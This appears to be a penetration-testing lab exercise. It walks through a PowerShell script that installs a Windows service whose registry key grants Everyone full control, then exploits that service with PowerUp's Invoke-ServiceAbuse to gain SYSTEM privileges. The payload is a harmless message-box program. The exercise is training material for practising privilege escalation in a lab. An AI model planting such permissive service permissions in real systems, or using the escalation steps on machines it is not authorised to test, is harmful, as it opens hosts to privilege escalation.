# Write A PS Script That Installs An Insecure Windows Service
An insecure Windows service is one that can be easily exploited by a Penetration Tester. These services often lack proper security protections and can be compromised through vulnerabilities in the code or weak passwords.

## References
- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) by HarmJ0y
- [How to Set Permission on a Service Using Subinacl](http://www.waynezim.com/2010/02/how-to-set-permission-on-a-service-using-subinacl/) by Wayne Zimmerman
- [Privilege Escalation with Insecure Windows Service Permissions](https://medium.com/r3d-buck3t/privilege-escalation-with-insecure-windows-service-permissions-5d97312db107) by Nairuz Abulhul on Medium
- [Digging Deeper into Vulnerable Windows Services](https://www.blackhillsinfosec.com/digging-deeper-vulnerable-windows-services/) by Brian Fehrman on BlackHillsInfoSec
- [Windows Privilege Escalation](https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/infrastructure/privesc_windows.md#Insecure-Service-Executables) by 0xJs on GitHub

## Tasks
- Research how to set up a Windows service with insecure configurations, such as weak permissions or allowing modifications by EVERYONE
- Create a PowerShell script that automates the creation of the insecure Windows service, incorporating the vulnerable configurations identified in the research
- Execute your PowerShell script to install the insecure Windows service on the target system
- Use PowerUp.ps1 to exploit the insecure Windows service that your script installed

## Recommended Approach
- Search the following keywords on Google: vulnerable windows service binpath
- Research how to modify the permissions of a Windows Service using SUBINACL.exe
- Research how to create a new Windows Service using sc.exe
- Create a vulnerable Windows Service that any user, regardless of their permission levels, can modify
- Use PowerUp.ps1 to exploit the vulnerable Windows Service and obtain unauthorised SYSTEM privileges on the machine

## Solutions With Scripts
1. Create a dummy malware executable, save the following C# code as `dummymalware.cs` and compile it into an executable
   ```
    using System;
    using System.Windows.Forms;
    
    class Program
    {
        static void Main()
        {
            MessageBox.Show("I'm a Dummy Malware", "Alert", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }
    }
   ```
   If Visual Studio is not available on the local machine, download it from [this link](https://visualstudio.microsoft.com/) and install it. To compile the script, open Visual Studio Developer Command Prompt, navigate to the folder where you saved the C# script and compile using
   ```
   csc /target:winexe /out:dummymalware.exe dummymalware.cs
   ```
2. Save the following PowerShell script as `insecureservice.ps1`. It will create a service called `InsecureService` that runs `dummymalware.exe`, and modifies service permissions so Everyone can modify the service, making it insecure
   ```
   # Define service variables
   $serviceName = "InsecureService"
   $serviceDisplayName = "Insecure Windows Service"
   $serviceDescription = "A vulnerable service with insecure permissions."
   $servicePath = "C:\Windows\System32\dummymalware.exe"  # You can specify any executable
   $serviceStartMode = "Automatic"
   
   # Step 1: Create the service
   New-Service -Name $serviceName -BinaryPathName $servicePath -DisplayName $serviceDisplayName -Description $serviceDescription -StartupType $serviceStartMode
   
   # Step 2: Modify registry permissions to make it insecure
   $acl = Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
   $rule = New-Object System.Security.AccessControl.RegistryAccessRule("Everyone", "FullControl", "Allow")
   $acl.SetAccessRule($rule)
   Set-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName" $acl
   
   Write-Host "$serviceName has been created with insecure permissions!"
   ```
3. Open PowerShell as Administrator, run `Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted` and then navigate to the folder where insecure service is stored and run `.\insecureservice.ps1`
4. To identify the insecure service with PowerUp.ps1, open PowerShell as Administrator, navigate to where PowerUp.ps1 is stored and run `.\PowerUp.ps1`.
   To check for services with weak permissions, run
   ```
   Get-ServiceUnquoted
   ```
   To check for services with writable executables, run
   ```
   Get-ModifiableServiceFile
   ```
   To check for service permissions, run
   ```
   Get-ServiceDetail -Name "InsecureService"
   ```
5. To exploit the insecure service with PowerUp.ps1, run
   ```
   Invoke-ServiceAbuse -Name "InsecureService" -Command "C:\Path\To\dummymalware.exe"
   ```
6. 
